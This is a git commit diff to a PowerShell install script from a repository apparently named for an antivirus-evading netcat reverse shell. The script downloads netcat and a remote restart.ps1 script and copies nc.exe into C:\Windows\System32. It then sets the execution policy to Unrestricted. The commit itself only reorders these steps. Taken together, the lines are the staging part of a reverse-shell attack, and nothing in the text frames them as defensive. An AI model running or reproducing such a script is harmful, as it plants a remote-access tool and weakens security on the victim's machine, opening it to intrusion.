40f08fb386b013c9746269e054002ead48f18431
bjrumplee <130537869+bjrumplee@users.noreply.github.com>
2023-05-05 15:37:11 -0700

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -1,7 +1,5 @@
-(New-Object System.Net.WebClient).DownloadFile('https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip', 'C:\Temp\netcat.zip')
-Start-Sleep -Seconds 5
 (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/bjrumplee/ncatreverseshellav/main/restart.ps1', 'C:\Temp\restart.ps1')
-Start-Sleep -Seconds 1
+(New-Object System.Net.WebClient).DownloadFile('https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip', 'C:\Temp\netcat.zip')
 Expand-Archive -Path 'C:\Temp\netcat.zip' -DestinationPath 'C:\Temp\netcat' -Force
 Move-Item -Path 'C:\Temp\netcat\nc.exe' -Destination 'C:\Windows\System32' -Force
 Set-ExecutionPolicy Unrestricted -Force
